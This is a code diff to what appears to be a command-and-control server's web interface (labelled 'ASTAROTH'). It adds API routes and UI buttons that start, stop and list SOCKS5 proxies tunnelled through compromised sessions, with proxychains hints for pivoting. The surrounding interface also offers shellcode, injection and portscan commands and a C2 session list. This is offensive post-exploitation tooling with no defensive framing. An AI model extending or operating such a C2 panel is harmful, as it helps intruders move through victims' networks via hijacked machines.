@@ -548,6 +548,21 @@ def handle_ui_request(method: str, path: str, body: bytes, db) -> tuple:
                 db.delete_session(sid)
             return _j({"deleted": sid})
 
+    # ── SOCKS5 endpoints ──────────────────────────────────────────────────────
+    if path == "/ui/api/socks5/status":
+        from server.https_server import socks5_status
+        return _j(socks5_status())
+
+    m = re.fullmatch(r"/ui/api/socks5/start/([^/]+)/(\d+)", path)
+    if m and method == "POST":
+        from server.https_server import socks5_start
+        return _j(socks5_start(m.group(1), int(m.group(2))))
+
+    m = re.fullmatch(r"/ui/api/socks5/stop/([^/]+)", path)
+    if m and method == "POST":
+        from server.https_server import socks5_stop
+        return _j(socks5_stop(m.group(1)))
+
     return 404, "application/json", b'{"error":"not found"}'
 
 
@@ -1098,6 +1113,10 @@ input[type=text]:focus { outline:none; border-color:var(--red); }
               <button class="qbtn" onclick="qi('shellcode ')">shellcode</button>
               <button class="qbtn" onclick="qi('inject ')">inject</button>
               <button class="qbtn" onclick="qi('portscan ')">portscan</button>
+              <span class="qlabel" style="margin-left:8px">SOCKS5▸</span>
+              <button class="qbtn" onclick="socks5Start()" title="Start SOCKS5 proxy on port 1080 for active session">socks5▸start</button>
+              <button class="qbtn" onclick="socks5Stop()" title="Stop SOCKS5 proxy for active session">socks5▸stop</button>
+              <button class="qbtn" onclick="socks5Status()" title="Show active SOCKS5 proxies">socks5▸status</button>
             </div>
             <div id="ast-strip" onclick="toggleAstaroth()">
               <span id="ast-strip-chip">⟁ ASTAROTH</span>
@@ -1930,6 +1949,32 @@ async function killSession() {
   await fetch('/ui/api/c2/'+selectedSid, {method:'DELETE'});
   deselectSession();
   await loadLive();
+}
+
+async function socks5Start() {
+  if (!selectedSid) { shellAppend('err', '[!] no session selected'); return; }
+  const port = prompt('SOCKS5 local port:', '1080');
+  if (!port) return;
+  shellAppend('sys', '[*] starting SOCKS5 proxy on 0.0.0.0:'+port+' → '+selectedSid+'…');
+  const r = await fetch('/ui/api/socks5/start/'+selectedSid+'/'+port, {method:'POST'});
+  const d = await r.json();
+  shellAppend(d.ok ? 'ok' : 'err', d.ok ? '[+] SOCKS5 listening on 127.0.0.1:'+port : '[-] '+JSON.stringify(d));
+}
+
+async function socks5Stop() {
+  if (!selectedSid) { shellAppend('err', '[!] no session selected'); return; }
+  const r = await fetch('/ui/api/socks5/stop/'+selectedSid, {method:'POST'});
+  const d = await r.json();
+  shellAppend(d.ok ? 'ok' : 'err', d.ok ? '[+] SOCKS5 stopped for '+selectedSid : '[-] '+JSON.stringify(d));
+}
+
+async function socks5Status() {
+  const r = await fetch('/ui/api/socks5/status');
+  const d = await r.json();
+  const entries = Object.entries(d);
+  if (entries.length === 0) { shellAppend('sys', '[*] no active SOCKS5 proxies'); return; }
+  for (const [sid, info] of entries)
+    shellAppend('ok', '[+] SOCKS5 session='+sid+' port='+info.port+' — proxychains: socks5 127.0.0.1 '+info.port);
 }
 
 async function dismissSession(sid) {
